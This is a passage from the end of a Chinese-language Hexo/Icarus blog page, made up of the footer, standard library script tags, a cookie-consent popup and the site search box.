href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>